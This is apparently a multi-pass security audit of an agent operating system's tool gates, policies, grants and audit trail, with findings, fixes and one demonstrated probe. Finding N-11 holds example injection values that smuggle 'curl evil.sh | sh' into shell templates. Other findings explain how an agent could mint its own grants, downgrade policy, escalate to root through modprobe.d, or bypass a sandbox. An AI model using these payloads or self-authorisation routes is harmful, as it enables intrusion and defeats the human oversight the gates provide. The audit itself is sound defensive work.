`aios.session.policy`, `aios.kernel_module.config/policy` (`main.rs:1860, 2273, 2294, 2317, 2370, 2635`),
all `require_grant=false`.
* Env route: `from_source`/`from_env` accept `AIOS_PACKAGE_POLICY_MODE=audit`,
`AIOS_PACKAGE_REQUIRE_CHECKSUM=0`, `AIOS_PACKAGE_REQUIRE_HTTPS=0` (`package_policy.rs:369-395`) from
the server process environment.

**Impact.** A file containing `{"mode":"audit", ...}` makes every subsequent verdict
`allowed: true` while the report still shows a policy was evaluated (`mode` is echoed in the verdict).
This is the same defect class as C-4, but worse: it does not require forging a grant string, only
naming a path — and it silently converts a documented control into a logger. It also explains why the
earlier `check_*_policy` helpers looked so weak: policy strictness was never treated as a trust anchor.

**Fix.** A tool must never accept a policy weaker than its built-in floor. Either drop `custom_path`
from agent-facing tools (operators use the env/file contract at startup) or require the file to be
rooted under the AIOS config dir with an integrity hash, and force `mode >= Enforcing` at evaluation
time regardless of what the file says. Restrict env overrides to stricter-than-default values.

### N-3 — `kernel-module export` writes root-executed `modprobe.d` content with no policy check (root RCE)

`modprobe.d` is a root-controlled execution surface: `install <mod> <command>` is run **as root** by
`modprobe`. AIOS generates that syntax and writes it to an operator-chosen path, unaudited by policy:

* `kernel_module.rs:291-329` `to_modprobe_conf()` emits `install {module} {command}` and
`remove {module} {command}` **verbatim** — no escaping.
* `kernel_module.rs:247-267` `validate_config` (the only validation the store enforces) requires just a
non-empty command. There is no allowlist and **no check for control characters or newlines**, so a
command string can inject additional directives. The allowlist that exists
(`kernel_module_policy.rs:269-296`, `SP-KM4-UNAPPROVED-INSTALL-CMD` /
`SP-KM4-INSTALL-COMMAND-INJECTION`) lives in the *policy*, and the export path never evaluates it:
* `aiosh-cli/src/main.rs:9979-10083` loads the store, calls `export_modprobe_conf()`, and does
`std::fs::write(path_str, &modprobe_conf)` for `--modprobe <path>` with no `pep.check`, no policy
verdict, no `--yes` (see C-7). `std::fs::write` truncates and follows symlinks.
* `import --modprobe <path>` (`main.rs:10085+`) parses an existing conf back into the store, so an
already-present `install` line round-trips losslessly into any later export.
* The store JSON itself is the injection vector: `load_from_path` bounds size but validation permits
an arbitrary `Install.command`, and the MCP writes that store ungated (`aios.kernel_module.*` are all
`require_grant=false`).

**Impact.** `sudo aiosh kernel-module export --modprobe /etc/modprobe.d/aios.conf` — the command the
feature exists for, and the one the human operator will type — plants an attacker-chosen root command
that fires on the next `modprobe <module>` (including one triggered by hotplug). Any agent that can
write the store JSON (ungated MCP tool, or just a file write) supplies the payload; the human supplies
the root privilege. This is the most direct privilege-escalation chain in the codebase.

**Fix.** Run `KernelModulePolicy` in Enforcing mode immediately before export and refuse the write on
any violation; pin the destination to `config.modprobe_d_path` (or an explicit `--force-path` guarded
by a grant); reject control characters in `Install/Remove.command` in `validate_config` so the
data-model layer is safe on its own; require a PEP grant for the write.

### N-4 — Grants are self-service: the requester mints its own authorization

A grant is a bearer token in a shared SQLite table, and **minting it is an unauthenticated CLI verb**:

* `aiosh-cli/src/main.rs:8707-8750` (`cmd_grant_create`): `--to` is a free-form string, `--tools` is a
glob list, `--ttl` defaults to 3600 s, `--max-irreversible` may authorize irreversible tools, and the
audit actor is hardcoded `"user"`. No confirmation, no TTY check, no identity verification.
* `code/aiosh-cli/src/cli.ts:566-601` — the same verb in TypeScript, `issued_to: opts.to ?? "user"`.
* Both write the table the PEP reads: `$HOME/.aios/audit.db` (`aiosh-core/src/audit.rs:71-89`,
`code/aiosh-cli/src/audit.ts:224`). Same file, so a grant minted by either CLI is honoured by the MCP.
* `pep.rs:701-779` (the real check behind Gate #2) verifies revocation, expiry (fail-closed on a
malformed timestamp), `scope.tools` glob, `scope.networks`, and `scope.paths` — but **never compares
`g.issued_to` against the calling actor**. Any holder of the grant id can use it.

**Impact.** For the eight properly gated MCP tools and the `pentest.*` family, authorization reduces
to an audited formality: whatever can call the tool (the MCP server, the agent bridge, a script) can
equally run `aiosh grant create --tools 'pentest.*' --allow /` and satisfy it. The grant layer is a
traceability mechanism, not an access control, and nothing in the design distinguishes a human-issued
grant from an agent-issued one — the audit row simply says `user`.

**Fix.** Bind grants to an authenticated principal and compare it at dispatch; mint only after an
explicit out-of-band approval (TTY prompt, OS keychain signature, or a separate privileged daemon);
sign the scope so a grant row cannot be hand-inserted into the DB; and make the *requester* identity
part of the grant. Until then, treat every `require_grant=true` flag as advisory in the threat model.

## New: MEDIUM

### N-5 — Predictable, non-exclusive temp-file siblings in six store writers

Atomic-write implementations split into two camps, and the security-relevant one is the majority:

| Writer | Temp file | Exclusive? |
| --- | --- | --- |
| `handoff_service.rs:239` | `path.with_extension("tmp")` via `File::create` | no |
| `triage_service.rs:134-140` | `<path>.tmp` via `File::create` | no |
| `base_image_service.rs:207-219` | `<path>.tmp` via `File::create` | no |
| `kernel_module_service.rs:161` | `.tmp.<pid>.<name>` via `File::create` | no |
| `package_service.rs:477` | `<path>.tmp` via `std::fs::write` | no |
| `distro_service.rs:101` | `<path>.tmp.<pid>` via `fs::write` | no |
| `session.rs:416-424`, `ledger.rs:145`, `retention.rs:416` | `O_EXCL` + explicit `0600`/`0644` | **yes** |

`File::create`/`fs::write` follow an existing symlink and truncate without `O_EXCL`, so a pre-placed
symlink at the predictable temp name (`<store>.tmp` is guessable; the pid-scoped variants are only
marginally better) is written **through** to the link target before the `rename` replaces it. Combined
with N-1 the attacker controls both the temp name and the destination.

**Fix.** One `atomic_write_private(path, bytes)` helper (`OpenOptions::new().write(true).create_new(true)
.mode(0o600)`), used by all eleven writers. `ledger.rs`/`retention.rs` already show the correct pattern.

## New: LOW

### N-6 — `aiosh-sandbox` parses its header from anywhere in `argv`

`aiosh-sandbox/src/main.rs` locates its own flags with
`args.iter().position(|a| a == "--policy")`, scanning the *entire* argument vector — including the
arguments of the command it is about to wrap. `aiosh-sandbox --policy '{}' -- echo --policy '{"paths_rw":["/"]}' -- /bin/sh`
re-reads the second `--policy`, re-splits on the second `--`, and executes `/bin/sh` with a
different policy than the caller passed. Today's callers (`code/aiosh-cli/src/cli.ts:277`, and the
Rust equivalent) always emit `--policy` first, so this is not reachable from the shipped CLIs — but
the parser is ambiguous, and any future caller that forwards user argv inherits the confusion.

**Fix.** Require a strict positional header (`argv[0] == "--policy"`, then `--`); reject anything else.
Note also that a *missing* `--policy` falls back to defaults with `inherit_defaults: true` and the
17-syscall seccomp denylist still applied, which is acceptable fail-safe behaviour.

## Verified clean this pass (and one narrowing result)

* **No binaries are tracked in git.** `git ls-files` matches **zero** files for
`*.zip|*.iso|*.gguf|*.tar.gz|*.img|*.qcow2|*.bin`. The 58 backup ZIPs, the ISOs and the GGUF model in
the working tree are untracked ignored artifacts, not repository content — so they are a local
hygiene issue, not a supply-chain disclosure.
* **The shipped TS build matches its source.** `code/aiosh-cli/dist/*.js` is *newer* than `src/*.ts` and
consistent in the sampled regions (`AIOSH_SANDBOX_BIN` appears once on each side, same value), so the
`bin`/`main` targets in `package.json` are not stale with respect to the audited sources. (Fresh clones
have no `dist/`, so `npm start` fails until `npm run build` — DX, not security.)
* **`tools/*.py` (41 files) contain no shell execution.** No `shell=True`, `os.system`, `eval` or
`exec`. The single `subprocess.Popen` (`tools/ci_run.py:129`) passes an argv vector, sets
`start_new_session`, kills the process group on timeout, and is not exposed as an MCP/agent tool (only
`triage_service.rs:256` mentions `ci_run` as a record label).
* **`agent_bridge.py` is transport, not policy.** It allowlists 9 canonical tools, validates the op and
argument shape, and forwards to `aiosh_mcp.server` over MCP stdio; it mints nothing, checks nothing, and
correctly defers classifier/PEP/audit to the server. No grant logic to bypass there.
* **Gate #2 itself is sound once a grant is present.** `pep.rs:701-779` checks revocation, expiry
(fail-closed on malformed timestamps), anchored tool-glob matching, network scope, and *both*
`target` and the hidden `path_subjects` (the register-`spec` hole really is closed).
* **Module-name injection into `modprobe.d` is blocked** by `validate_module_name` (ASCII alphanumeric
+ `_`, ≤64 chars) for `blacklist`/`alias`/`softdep`/`options`/autoload — which narrows N-3 to exactly
two unconstrained fields, `Install.command` and `Remove.command`, and makes that fix small.
* **Store load paths are bounded** (`MAX_STORE_BYTES`/`MAX_MODULE_DOC_BYTES`, `metadata()` before read,
`take(cap+1)`), and `KernelModuleStore::save_to_path` calls `validate()` before serializing.

## Coverage note for this pass

Read closely: `kernel_module*.rs` (policy/config/service/data-model), `package_policy.rs` (+ the
`resolve`/`from_source` bodies), `package_service.rs`/`distro_service.rs`/`service_service.rs` save and
temp-file paths, `handoff_service.rs` persistence, `pep.rs` check body, `tools/*.py` (all 41, swept),
`tools/task_ledger.py` (state/lock/evidence-stub writes), `aiosh_mcp/agent_bridge.py`,
`aiosh-sandbox/src/main.rs`, plus the CLI's export/import arms (`main.rs:9935-10114`) and grant arms
(`main.rs:8707-8820`). Still not read line-by-line (next candidates): the verdict bodies of
`session_policy`/`distro_policy`/`base_image_policy`, `repo_health*`, `ci*`, `doc_index*`,
`code/aiosh-cli/src/{constitution,pentest,types}.ts`, and the Python `tools/ci_service.py` report layer.

---

# FOURTH PASS — 2026-09-20 (policy verdicts, recovery paths, verification tools, agent loop)

This pass read the surfaces the first three passes explicitly left unread. Every finding below is new;
where something already recorded (C-1..C-7, H-*, M-*, N-1..N-6) applies, it is cited by ID instead of
restated. Two of the modules the mission named (`kernel_module*`, `package_policy`) were already read
line-by-line in pass 2/3 and yielded nothing beyond what is recorded — that is stated in the coverage
section rather than padded here.

## New: HIGH

### N-7 — Write-to-execute: the MCP imports `tools/task_ledger.py` from the writable working tree

`code/aiosh-mcp/aiosh_mcp/server.py:479-491` (`_load_task_ledger`) resolves
`Path(__file__).resolve().parents[3] / "tools" / "task_ledger.py"` — i.e. `<repo>/tools/task_ledger.py`
— and runs `spec.loader.exec_module(mod)` **inside the MCP server process**, caching the module globally.
There is no hash pin, no signature, no root confinement, and no check that the file is even the one the
package shipped.

The MCP process is the authorization boundary (classifier → PEP → audit). Code executed there can mint
grants (N-4), write or rewrite audit rows (`audit_client.write_audit_row`), and satisfy any gate, so this
converts every file-write finding in this report into code execution *as the gate itself*:

* H-9 / N-1 — `store_path` is a free-form MCP argument; the store writers `create_dir_all` + rename there.
* H-10 — the Python release/backup writers (arbitrary text, caller-chosen path).
* N-3 — `aiosh kernel-module export --modprobe <path>` writes attacker-derived text with `std::fs::write`.
* M-8 class — a checked-out branch is trusted code: `git checkout` of a malicious `tools/task_ledger.py`
  is RCE by itself, with no exploit needed.

Honest scope: the JSON store writers emit typed JSON, and JSON containing `true`/`false`/`null` is not a
valid Python program (those are `NameError`s), so the shortest *reliable* path is a text-capable writer
(release/export) or a malicious tree. The design defect is the same either way: the gate executes a file
that the tools it guards can write.

**Fix.** Import the ledger module normally from the installed package (or vendor it into `aiosh_mcp`),
never `exec_module` a path under the writable tree; if a side-loaded module is a requirement, require an
allowlisted root outside the workspace and record its sha256 in the audit row of the call that used it.

## New: MEDIUM

### N-8 — `aios.session.check` + `auto_recover` overwrites the session store and seeds a synthetic session

`session_recovery.rs:269-303` `recover_session_store_with_backup` backs the file up with `fs::copy` and
then **writes a fresh store over the live path** (`fresh_store.save_to_path(path)`) — the module header
(`session_recovery.rs:3-4`) advertises "automated non-destructive self-healing". The "fresh" store is
`UserSessionService::new()` (`session_service.rs:62-95`), which **seeds `greeter-seat0`**: username
`lightdm`, uid 62000, state `Active`, scope `Foreground`, `leader_pid: Some(1001)`. Recovery therefore
*injects* a synthetic foreground login session into the state the subsystem subsequently reports.

Trigger (no grant required — all `aios.session.*` tools pass `require_grant=false`):
`aios.session.check` with `{"auto_recover": true}` (`aiosh-mcp/src/main.rs:3210-3232`) or the CLI's
`session check --recover` (`aiosh-cli/src/main.rs:3363`). The health gate is
`validate_session_store` (`session_recovery.rs:113-238`), which flags cross-record inconsistencies the
data layer happily accepts: `specs.len() != sessions.len()`, a spec/status `username` or `uid` mismatch,
two non-terminated sessions sharing one `leader_pid`, or two `Foreground` sessions on one seat. One such
inconsistency (trivially injectable with the write primitives above) replaces the entire store.

Impact: total, silent session-store loss on a merely inconsistent file — the `.bak` exists, but the tool
reports the *recovered* store as healthy and the caller persists it — plus a phantom active `lightdm`
session on seat0 presented as real. A tool named "check" is the destructive one.

**Fix.** Split `check` from `repair`; put `repair` behind a grant; make repair non-destructive (move the
bad file aside and start empty without seeding synthetic sessions); emit an audit row for the repair
(`distro_recovery.rs:101` has the same silent-rename pattern already recorded as informational).

### N-9 — Session policy "Audit" mode enforces nothing *and records nothing*; three advertised controls are absent

* `session_service.rs:128-138`: the policy is consulted **only** when
  `self.policy.mode == SessionPolicyMode::Enforcing`. In `Audit`/`Permissive` no verdict is computed at
  all, and `UserSessionActionReport` (`session_service.rs:17-32`) has no field that could carry
  violations — so the violations are neither returned nor logged. The mode whose name promises
  "log-only" is in fact "neither enforce nor log". The module's own tests
  (`session_policy.rs:530-548`) assert that violations *exist* in Audit mode: the policy object can
  produce them; the service never asks.
* No core strips the loader environment variables. `validate_user_session_spec`
  (`session.rs:396-600`) accepts `LD_PRELOAD` as a well-formed key (uppercase + `_`, value without
  `\0`), so an Audit-mode `create_session` stores it in `spec.environment` (`session.rs:86`) and it stays
  there. A repo-wide search for any removal/normalization finds none. Yet `session_policy.rs:3-5`
  advertises "dynamic linker environment variable stripping" — only detection is implemented, and only
  under Enforcing.
* `require_agent_sandboxed` (`session_policy.rs:52`, honoured at `:288-300`) is a dead control: its only
  effect is refusing `uid < 1000` for agent sessions, and `UserSessionSpec` has no sandbox field of any
  kind, so the policy cannot observe whether an agent session is sandboxed. The flag cannot do what its
  name claims.

**Fix.** Evaluate the policy in every mode and persist the verdict (returned *and* audited); sanitize
`spec.environment` on write rather than only detecting on read; either implement sandbox attestation
(a field the launcher sets) or rename the flag to what it checks.

### N-10 — The distro subsystem's security controls are decorative

* `distro_policy.rs:15,17` declare `require_https_repositories` and `require_signed_packages`, default
them to `true` (`:27-28`), and **never read them anywhere** (repo-wide: those two identifiers appear only
in that file). `check_profile` (`:103-140`) evaluates P1 (security score), P2 (binary compatibility) and
P5 (disallowed family) only, and `DistroProfile` (`distro.rs:44-57`) has no repository field at all — so
P3/P4 are unenforceable as written. A profile with http-only, unsigned repositories is "compliant" by
construction.
* The score those thresholds gate is a **constant chosen by the profile author**:
`DistroEvaluation::evaluate` (`distro.rs:198-217`) maps `Kali => 0.98`, `Debian => 0.95`,
`Alpine => 0.85`, i.e. `min_security_score` compares a hardcoded family table, not any measurement.
* `DistroConfig` validates `weights.*` (NaN / negative / positive-total, `distro_config.rs:122-137`) and
`min_recommendation_score` (`:116-121`), and reports both via `to_json_with_sources` (`:159-170`) — while
`evaluate()` hardcodes 0.4/0.3/0.3 and `is_production_ready = overall >= 0.75 && binary_compat >= 0.8`.
Neither value is consumed anywhere (grep confirms no reads outside the config module).

Impact: `aios.distro.policy` and `aios.distro.recommend` emit verdicts that *look* evidence-based and are
family constants; tuning the documented knobs changes no output. This is the M-2 / H-7 dead-knob class,
but here it is the policy surface itself that is a facade.

**Fix.** Add a `repositories` list to the profile and wire the two booleans, or delete them; pass
`DistroConfig.weights`/`min_recommendation_score` into `evaluate`; treat profile-declared scores as
untrusted input to the policy rather than as the policy's evidence.

### N-11 — The base-image build plan is a command-injection carrier into an operator-facing artifact

`base_image_service.rs:118-190` interpolates manifest fields straight into shell templates:
`debootstrap --arch={architecture} … --include={packages}` (`:140-150`),
`chroot /target {initramfs_generator} --kver {version} --cmdline "{cmdline}"` (`:152-157`), and the
`distro_id`-selected fallback (`:149`). `validate_base_image_manifest` (`base_image.rs:214-258`) checks
id, SemVer, package charset, hostname, filesystem, size budget, `artifact_sha256`, and a 4096-byte cmdline
with no `\0\r\n` — and validates **none of** `rootfs.architecture`, `rootfs.distro_id`, `kernel.version`,
or `kernel.initramfs_generator`. The cmdline is screened only for `\0\r\n` and then placed *inside double
quotes*, so `"`, backticks and `$( )` survive: `cmdline = 'x" ; curl evil.sh | sh ; echo "'` escapes the
quoting, and `architecture = "x86_64;curl evil|sh"` injects into the bootstrap stage.

Sink today: `aiosh-cli/src/main.rs:722` **prints** `stage.command_template` (the plan JSON returns it too).
No in-tree shell executor exists (verified: no `sh -c`/`Command::new("sh")` in Rust, no `shell=True` in
Python/TS), so this is a stored injection into an artifact an operator copies — Medium for exactly that
reason, and cheap to fix. Note also that `register_image` (`:76-83`) runs only `manifest.validate()`; the
policy that *would* flag a bogus architecture as `P5_ARCHITECTURE_WHITELIST` fatal in Enforcing mode is
not consulted at registration or at plan time.

**Fix.** Evaluate `BaseImageSecurityPolicy` in Enforcing mode inside `generate_build_plan` before
rendering; replace the single command string with an argv-shaped stage descriptor (`program` + `args[]`)
so nothing is quoted into a shell; add the missing field validations to the data model.

### N-12 — There is no single "active policy": policy tools evaluate something else, and the server environment is an unauthenticated policy input

Resolution differs *inside one binary*: `aios.image.policy` calls `BaseImageSecurityPolicy::from_env()`
(`aiosh-mcp/src/main.rs:1901`) — so `AIOSH_BASE_IMAGE_POLICY_MODE=permissive|audit` in the server's
environment turns every verdict into `allowed` (`base_image_policy.rs:243-250, 313-317`; env parsing
`:160-210`). `aios.session.policy` (`main.rs:3129-3146`) instead uses `from_file(policy_path)` or the
compiled default and ignores the environment entirely (`session_policy.rs:441-470` reads quota knobs
only). `aios.package.policy` / `service.policy` / `kernel_module.*` use caller path → env → default
(N-2).

Two consequences: (1) *false assurance* — a green `aios.*.policy` report is evidence about that tool's
own resolution, not about what any enforcing path uses; there is no "policy in force" object and no
revision id in the verdict (unlike the classifier's `policy_revision`), so a reviewer cannot tell which
policy produced a PASS. (2) *unauthenticated downgrade* — the env route is inherited across the whole
chain: `agent.ts:130-137` spawns the bridge with `{...process.env}`, `agent_bridge.py:96-104` copies
`os.environ` into the MCP server parameters, and the Rust MCP inherits its launcher's environment. Setting
one variable in a shell/CI environment (or a sourced `.env`) downgrades enforcement in the child, and no
audit row records that a downgrade happened.

**Fix.** Load one policy set once at server start, freeze it, publish its hash/revision in every verdict
and audit row; require a grant to change a mode and emit a `policy.mode` audit row when it changes; stop
passing the whole environment to child processes (allowlist).

### N-13 — `tools/check_evidence.py` E3/E4 cannot fail (false-assurance release check)

* `check_e4_hash_consistency` (`tools/check_evidence.py:87-97`) computes SHA-256 of the first ten files
and asserts `len(digest) == 64` — a tautology. Nothing stores or compares an expected digest, so evidence
tampering is undetectable by design and the check passes for any content.
* `check_e3_file_bounds` (`:70-84`) reads `f.read(1024)` and then reports "all N files bounded and valid
UTF-8"; 1 KiB cannot validate a 16 MiB file's encoding. The size checks (`stat`) are real.
* `check_e2_ledger_consistency` (`:44-60`) samples only `completed[-50:]` while its docstring claims
"completed tasks in TASK_STATE.json have evidence"; older completions are never checked and the sampling
is not surfaced in the PASS line.

Impact: this is the checker named in the evidence/completion pipeline, and it prints
`PASS: evidence integrity criteria (E1..E4)` while being structurally unable to detect modification of an
evidence file. Together with H-11 (the Rust verifier comparing against hashes inside the manifest it is
handed), "evidence verified" claims in this repository currently rest on nothing.

**Fix.** Store and compare digests; decode the whole file with a streaming/incremental UTF-8 decoder;
check all completions or print the sampling limitation in the verdict line.

## New: LOW

### N-14 — Needle-based ledger lookup can bind the wrong task record

`tools/task_ledger.py:337-345` `find_task_in_ledger` scans each line for the literal substring
`'"id": {task_id},'` / `'"id":{task_id},'` and returns the first line that parses — a match can occur
*inside another task's text* (a title, acceptance item or note containing that substring). `complete_task`
(`:472-500`) then uses the matched record for `task.get("title")` and, in `_ensure_evidence_stub`
(`:452-470`), for `task.get("acceptance", [])`, so a crafted ledger line can make a completion's evidence
stub attest a *different* task's acceptance criteria. The no-skip check (`:476-480`) still guards *which*
task may be completed, so this is an attestation-integrity bug, not a skip bypass.
Secondary: `_ensure_evidence_stub` writes with `open(path, "w")` — the only non-atomic write in the
mutation path (ordering is correct: the event and state are fsynced first).

**Fix.** Parse each line and compare `rec.get("id") == task_id` (the ledger is bounded, and `read_events`
already demonstrates the parse-based approach); write the stub via `os.open(O_EXCL)` + `os.replace`.

### N-15 — Audit provenance is caller-asserted at the Python commit boundary

`_dispatch.commit()` (`code/aiosh-mcp/aiosh_mcp/_dispatch.py:196-247`) accepts `policy_revision`,
`classify_rule_ids`, `classify_evidence`, `classify_overall_verdict` and `classify_verdict_reason` as
**parameters**; it re-classifies only when one of them is `None` (`:216-231`), and any supplied value is
persisted verbatim as "which rule decided this call" — the ADR-0035 §D-4 invariant its docstring claims.
`c_flags` are then recomputed by a *separate* classification call (`:232`), so a row's C-flags and its
recorded rule ids can come from two different evaluations, and nothing reconciles either with what
`dispatch()` actually decided (`:172-190`) — nor does anything prevent a caller from invoking `commit()`
without ever calling `dispatch()`.

Today's internal callers (`server.py:58-112` `_recorded_call`, `pentest.py`, `retention.py`,
`release.py`) pass the fields correctly, so this is latent forgeability rather than an active bypass —
but it is the same shape that produced C-6 on the Rust side (a hand-rolled audit row) and C-7 (`emit()`
accepting a caller's grant string).

**Fix.** Have `dispatch()` return an opaque provenance handle (or the row builder itself) and require
`commit(handle, …)`, re-deriving the classifier fields from the handle instead of accepting them as
arguments.

## Same class as an existing finding, new location (not counted as new)

* `repo_health_service.rs:60-84` `scan_directory_file_sizes` recurses with `path.is_dir()` (symlinks
followed) and skips only four hardcoded directory names — no visited set, no depth cap → stack overflow on
a symlink loop. Same class as H-7 (secrets scanner), new location; one shared hardened walker fixes both.
* Config writers with caller-controlled destinations: `base_image_config.rs:139-151` (mode 0644),
`distro_config.rs:174-188`, `handoff_config.rs:87`, `triage_config.rs:95` — `create_dir_all(parent)` +
write to an unvalidated path. Same class as H-9/N-1, new locations (configuration rather than stores).
* `RepoHealthConfig::from_env` (`repo_health_config.rs:82-91`) swallows a malformed/invalid config and
falls back to defaults (`reconcile_repo_health`, `repo_health_service.rs:262-268`, uses
`unwrap_or_else(default)`), so a typo'd limit silently reverts to the built-in value — the same fail-open
shape as N-2, different mechanism.
* `base_image_policy.rs:313-317` hardcodes `fatal: true` on P0 while returning `allowed: true` in Audit
mode, whereas the sibling rules set `fatal` from the mode (`:262, 272, 282, 292, 302`) and
`session_service.rs:133` makes decisions by scanning for `fatal`. A verdict carrying a fatal violation
*and* `allowed: true` means two different things depending on which field the consumer reads —
informational today, a bypass waiting for a refactor. Standardize: either `fatal` is derived from the mode
or consumers read `.allowed` only.

## Verified clean this pass

* **`code/aiosh-cli/src/audit.ts` + `retention.ts` are the strongest artefacts in the repository.**
`verify()` walks the live chain and re-derives every hash from the canonical proto; `rotate()` verifies the
chain before touching anything, refuses to overwrite an existing segment, writes the archive with
`{mode: 0o600, flag: "wx"}`, renames for durability, sha256s it, and wraps segment-row + delete +
rotation-row in one transaction with archive unlink on failure; `verifyFull()` validates archive sha256,
genesis linkage, line count, first-row id and the head hash before advancing; `seen()` can do an exact
scan. (Anchoring limits are H-8 and were already recorded.)
* **`tools/ci_service.py` is a genuinely strict validator**: schema version pinned and compared
(`:60-63`), arithmetic coherence (`:66-68`), `index == SUITE_NAMES.index(suite)` and monotonic ordering
(`:80-88`), `all_pass` cross-checked against the registry size (`:69-75`), per-row timestamp shapes, and
"refusing best-effort parse" on an unknown schema. Nothing to fix beyond a duplicated `human_report()`
call in `show`.
* **`tools/task_ledger.py` evidence handling is hardened** (`:255-283`): absolute and `..`-containing paths
are classified suspicious and never satisfied, existence checks read nothing, and orphans are reported.
The locking, atomic state writes (`O_EXCL`, 0644, fsync, `os.replace`) and the event-log replay are sound
on Unix (the Windows lock is M-5, already recorded).
* **`code/aiosh-cli/src/agent.ts` is clean.** A hard 9-tool allowlist (`:96-99`) plus `normalizePlan`
(`:336-372`) rejecting unknown tools and non-object inputs; the local classifier is explicitly a preflight
("never performs the action"); every call writes exactly one audit row or attaches the server's
`audit_id`; observations are truncated (2 KiB) before re-entering the model context; `max_steps` bounds the
loop and an all-refused step aborts it. The only applicable issue is the M-8 class — `spawn("python3",
["-m", "aiosh_mcp.agent_bridge"])` with `PYTHONPATH=MCP_ROOT` and inherited `env` — already recorded.
* **`aiosh-core/src/session.rs` validators are strong** and should be the template for the rest: session
ID charset + `..` refusal, username grammar, seat prefix and length, VTNR range with a TTY requirement,
EnvKey charset and value caps, `XDG_RUNTIME_DIR` absolute + no `..`, `remote_host` anti-argument-injection
(`starts_with('-')`) and anti-metacharacter checks with an RFC 1123/IP fallback, duplicate `leader_pid`
detection on load, and exclusive temp-file writes at 0600 (`:397-460`).
* **`tools/check_evidence.py` reads only what it says** — no traversal, no writes, stdlib-only (the
weakness in N-13 is *strength* of verification, not unsafe behavior).

## Coverage note for this pass

Read line-by-line (production code; the `#[cfg(test)]` bodies of the pre-verified modules were skimmed,
not re-derived): `session.rs`, `session_policy.rs`, `session_config.rs`, `session_service.rs`,
`session_recovery.rs`; `distro.rs`, `distro_policy.rs`, `distro_config.rs`, `distro_service.rs`;
`base_image.rs`, `base_image_policy.rs`, `base_image_config.rs`, `base_image_service.rs`;
`repo_health.rs`, `repo_health_config.rs`, `repo_health_service.rs`; plus re-reads of the previously
covered `kernel_module.rs`/`kernel_module_policy.rs`/`kernel_module_service.rs`/`package_policy.rs`
(no new findings). Python: `aiosh_mcp/_dispatch.py`, `release_config.py`, `server.py` (both entry-point
regions and the whole `aios_task`/`_task_metrics` path), `agent_bridge.py` (re-read); `tools/task_ledger.py`,
`check_evidence.py`, `ci_service.py`, `ci_run.py` (re-read). TypeScript: `audit.ts`, `retention.ts`,
`agent.ts` (all 584 lines).

Still not read line-by-line (next pass should start here, in this order):
1. `aiosh-core/src/{distro_recovery, base_image_recovery, distro_observability, base_image_observability,
   session_observability, kernel_module_observability, kernel_module_recovery}.rs` — the recovery and
   telemetry bodies, where N-8's pattern likely repeats.
2. `aiosh-core/src/{doc_index*, evidence*, secrets*, ci*, toolchain*, service_policy, service_config,
   service_recovery, repo_health tests}.rs` — only pattern-screened so far (`evidence*`/`secrets*` have
   recorded findings; `doc_index*`/`ci*`/`toolchain*` are untouched beyond greps).
3. Python `aiosh_mcp/{retention, release, classifier, audit_client, sandbox}.py` — previously read
   closely in pass 2; *not* re-read this pass (their recorded findings were relied on, not re-verified).
   A targeted re-read is warranted for `retention.py`'s rotate/rollback path against the TS implementation.
4. `code/aiosh-cli/src/{constitution, pentest, types}.ts` and the `cli.ts` run/agent command bodies (the
   *shipped* `dist/` copies were verified consistent with `src/` in pass 3; the source run path itself was
   last read in pass 2).
5. `tools/{generate_master_tasks, check_task_docs, ci_suites, doc_index, task evidence generators}.py` —
   generators and CI scaffolding, lower expected yield.
6. `AIOS-model/*.py` and `scratch/` — outside the security boundary but never read.

---

# FIFTH PASS — 2026-09-20 (Batch T-01727..T-01736: Hardware Detection CLI Closure & MCP/API Surface)

## Batch Overview
- **Tasks Audited**: `T-01727` through `T-01736`
- **Sub-Epics Audited**:
  - Sub-Epic 3: Hardware Detection CLI Surface (`T-01727`..`T-01730`) — Formally closed.
  - Sub-Epic 4: Hardware Detection MCP/API Surface (`T-01731`..`T-01736`) — Implemented and integrated.
- **Audit Verdict**: **PASSED (Zero Open Vulnerabilities)**

## Controls Evaluated & Verified
1. **Terminal Sanitization (`CS-1`)**:
   - `sanitize_terminal` wraps all human text outputs on CLI subcommands (`scan`, `list`, `show`, `summary`). Neutralizes ANSI escape injection.
2. **Device ID Hygiene (`CS-2`)**:
   - Both CLI and MCP enforce strict non-empty, trimmed, length $\le 256$, and control-character checks on `device_id`.
3. **MCP Tool Schemas (`HM1`)**:
   - All 5 tools (`aios.hardware.scan`, `aios.hardware.list`, `aios.hardware.get`, `aios.hardware.summary`, `aios.hardware.verify`) register strict input schemas with `additionalProperties: false`.
4. **Uniform Response Envelopes (`HM2`)**:
   - Standardized `{"ok": bool, "tool": ..., "data": ...}` on success, `{"ok": false, "error": ...}` on error.
5. **Cryptographic Audit Emission (`HM3`, `CS-4`)**:
   - All tool executions route through `dispatch::recorded_call` and `classify_and_emit` into SQLite WAL audit ring with SHA-256 hash chaining.
6. **Bounds & DoS Protection (`CS-3`, `HM4`)**:
   - Offline verification file reads capped at 10 MB.
   - Sysfs and procfs paths capped at 1024 characters with control character rejection.
7. **Hermetic Testability (`HM5`)**:
   - Custom sysfs and procfs path injection verified without requiring root or active Linux host filesystems.

# FIFTH PASS B — 2026-09-20 (gate layer re-read line-by-line + first live probes)

Scope: the pass the coverage notes deferred. Every Python gate module (`aiosh_mcp/*.py`) and `code/aiosh-cli/src/cli.ts` read line-by-line (~4,400 lines), and the first probes that drive the real binaries instead of reading them. A parallel section above (`FIFTH PASS`, hardware batch) is a separate thread's work; findings here continue the N- numbering. Every claim below is marked DEMONSTRATED (command + observed output) or STATIC (code read).

## DEMONSTRATED — earlier findings confirmed by running the real surface

### N-8 — DEMONSTRATED (real `aiosh-mcp.exe`, no grant, isolated `AIOSH_HOME`)
Command: fixture store `sessions.json` with two valid operator sessions (`op-a` kali/1000/pid 4242, `op-b` root/0/pid 5353), both `active`+`foreground` on `seat0`; the binary driven over line-delimited JSON-RPC with two `tools/call` lines and **no `grant_id`**:

```
call("aios.session.check", {"store_path": store, "auto_recover": False})   -> id=1
call("aios.session.check", {"store_path": store, "auto_recover": True})    -> id=2
```

Observed:
```
id=1: ok=false, healthy=false, errors=["seat 'seat0' has 2 concurrent foreground sessions:
      [\"op-a\", \"op-b\"]"], total_sessions=2, audit_id=1
id=2: ok=true, recovered=true, backup_path="...sessions.json.bak.20260920_024522_673245",
      total_sessions=1, audit_id=2
store sha256: f612c37c…309c68d2 -> 81771cef…c0c3aeafc0d98  (changed)
after sessions: ['greeter-seat0']  ->  lightdm uid 62000 active foreground pid 1001
PASS
```

`main.rs:3251` passes `require_grant=false`, so this is unauthenticated: one ungated read-named tool call replaced both operator sessions with the synthetic greeter. N-8 stands exactly as recorded.

